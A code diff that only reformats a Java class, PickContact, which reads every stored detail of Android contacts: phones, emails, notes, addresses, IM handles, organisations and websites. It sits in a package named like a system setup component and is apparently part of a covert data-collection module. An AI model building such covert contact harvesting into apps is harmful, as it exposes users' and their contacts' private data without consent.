@@ -9,8 +9,6 @@
 
 package com.android.syssetup.module.task;
 
-import java.util.Hashtable;
-
 import android.content.ContentResolver;
 import android.database.Cursor;
 import android.provider.BaseColumns;
@@ -22,6 +20,8 @@ import android.provider.ContactsContract.CommonDataKinds.Phone;
 
 import com.android.syssetup.Status;
 
+import java.util.Hashtable;
+
 public class PickContact {
 	private static final String TAG = "PickContact"; //$NON-NLS-1$
 
@@ -32,7 +32,7 @@ public class PickContact {
 
 		if (hasPhone > 0) {
 			final String phoneWhere = Phone.CONTACT_ID + " = ? "; //$NON-NLS-1$
-			final String[] phoneWhereParams = new String[] { userId + "" }; //$NON-NLS-1$
+			final String[] phoneWhereParams = new String[]{userId + ""}; //$NON-NLS-1$
 			final Cursor phoneCursor = cr.query(Phone.CONTENT_URI, null, phoneWhere, phoneWhereParams, null);
 
 			while (phoneCursor.moveToNext()) {
@@ -55,8 +55,8 @@ public class PickContact {
 
 		final long userId = cursor.getLong(cursor.getColumnIndex(BaseColumns._ID));
 
-		final Cursor emailCur = cr.query(Email.CONTENT_URI, null, Email.CONTACT_ID + " = ?", new String[] { userId //$NON-NLS-1$
-				+ "" }, null); //$NON-NLS-1$
+		final Cursor emailCur = cr.query(Email.CONTENT_URI, null, Email.CONTACT_ID + " = ?", new String[]{userId //$NON-NLS-1$
+				+ ""}, null); //$NON-NLS-1$
 
 		while (emailCur.moveToNext()) {
 			final String email = emailCur.getString(emailCur.getColumnIndex(Email.DATA));
@@ -82,7 +82,7 @@ public class PickContact {
 
 		final String noteWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE //$NON-NLS-1$
 				+ " = ?"; //$NON-NLS-1$
-		final String[] noteWhereParams = new String[] { userId + "", Note.CONTENT_ITEM_TYPE }; //$NON-NLS-1$
+		final String[] noteWhereParams = new String[]{userId + "", Note.CONTENT_ITEM_TYPE}; //$NON-NLS-1$
 
 		final Cursor noteCur = cr.query(ContactsContract.Data.CONTENT_URI, null, noteWhere, noteWhereParams, null);
 
@@ -95,7 +95,7 @@ public class PickContact {
 		final String nickNameWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " //$NON-NLS-1$
 				+ ContactsContract.Data.MIMETYPE + " = ?"; //$NON-NLS-1$
 
-		final String[] nickNameWhereParams = new String[] { userId + "", Nickname.CONTENT_ITEM_TYPE }; //$NON-NLS-1$
+		final String[] nickNameWhereParams = new String[]{userId + "", Nickname.CONTENT_ITEM_TYPE}; //$NON-NLS-1$
 
 		final Cursor nickCursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, nickNameWhere,
 				nickNameWhereParams, null);
@@ -116,8 +116,8 @@ public class PickContact {
 		final String addrWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE //$NON-NLS-1$
 				+ " = ?"; //$NON-NLS-1$
 
-		final String[] addrWhereParams = new String[] { userId + "", //$NON-NLS-1$
-				ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE };
+		final String[] addrWhereParams = new String[]{userId + "", //$NON-NLS-1$
+				ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE};
 
 		final Cursor addrCur = cr.query(ContactsContract.Data.CONTENT_URI, null, addrWhere, addrWhereParams, null);
 
@@ -156,8 +156,8 @@ public class PickContact {
 
 		final String imWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE //$NON-NLS-1$
 				+ " = ? "; //$NON-NLS-1$
-		final String[] imWhereParams = new String[] { userId + "", //$NON-NLS-1$
-				ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE };
+		final String[] imWhereParams = new String[]{userId + "", //$NON-NLS-1$
+				ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE};
 		final Cursor imCursor = cr.query(ContactsContract.Data.CONTENT_URI, null, imWhere, imWhereParams, null);
 
 		while (imCursor.moveToNext()) {
@@ -181,8 +181,8 @@ public class PickContact {
 
 		final String orgWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE //$NON-NLS-1$
 				+ " = ? "; //$NON-NLS-1$
-		final String[] orgWhereParams = new String[] { userId + "", //$NON-NLS-1$
-				ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE };
+		final String[] orgWhereParams = new String[]{userId + "", //$NON-NLS-1$
+				ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE};
 
 		final Cursor orgCursor = cr.query(ContactsContract.Data.CONTENT_URI, null, orgWhere, orgWhereParams, null);
 
@@ -209,8 +209,8 @@ public class PickContact {
 		final long userId = cursor.getInt(cursor.getColumnIndex(BaseColumns._ID));
 		final String websiteWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE //$NON-NLS-1$
 				+ " = ? "; //$NON-NLS-1$
-		final String[] websiteWhereParams = new String[] { userId + "", //$NON-NLS-1$
-				ContactsContract.CommonDataKinds.Website.CONTENT_ITEM_TYPE };
+		final String[] websiteWhereParams = new String[]{userId + "", //$NON-NLS-1$
+				ContactsContract.CommonDataKinds.Website.CONTENT_ITEM_TYPE};
 
 		final Cursor webCursor = cr.query(ContactsContract.Data.CONTENT_URI, null, websiteWhere, websiteWhereParams,
 				null);
